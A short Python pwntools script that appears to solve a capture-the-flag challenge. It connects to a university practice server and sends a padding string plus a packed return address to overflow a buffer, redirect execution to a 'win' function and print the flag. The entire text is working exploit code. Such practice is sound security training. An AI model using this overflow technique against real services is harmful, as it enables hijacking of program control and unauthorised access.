from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 22154

## run a remote process
s = remote(SERVER, PORT, timeout=9999)

win_address = p32(0x80486f1)
s.recvline()
s.sendline(b'A'*22+win_address)
flag = s.recvall()
print(flag)


